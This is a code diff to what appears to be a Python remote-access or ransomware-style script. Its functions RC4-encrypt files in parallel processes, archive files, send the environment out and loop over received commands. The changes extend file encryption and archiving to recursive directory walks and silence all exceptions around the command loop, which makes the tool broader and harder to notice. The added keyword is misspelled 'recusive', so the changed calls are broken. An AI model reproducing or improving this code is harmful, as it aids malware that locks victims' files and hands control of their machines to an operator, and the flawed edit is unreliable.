@@ -156,7 +156,7 @@ def rc4(plaintext: bytes, decrypt: bool = False) -> bytes:
 
 def encrypt_files(key, *paths, decrypt: bool = False):
     for path in paths:
-        for filepath in iglob(path):
+        for filepath in iglob(path, recusive=True):
             process = Process(
                 target=encrypt_file,
                 args=(key, filepath, decrypt),
@@ -182,7 +182,7 @@ def make_tar_archive():
         tuple(
             tarfile.add(filepath)
             for path in paths
-            for filepath in iglob(path)
+            for filepath in iglob(path, recusive=True)
         )
 
 def make_zip_archive(name, *paths):
@@ -190,7 +190,7 @@ def make_zip_archive(name, *paths):
         tuple(
             zipfile.write(filepath)
             for path in paths
-            for filepath in iglob(path)
+            for filepath in iglob(path, recusive=True)
         )
 
 def archive_files(name, *paths):
@@ -497,7 +497,7 @@ def command(data):
     return data
 
 while True and __name__ == "__main__":
-    # with suppress(Exception):
+    with suppress(Exception):
         send_environnement()
         data = b" "
         while True:
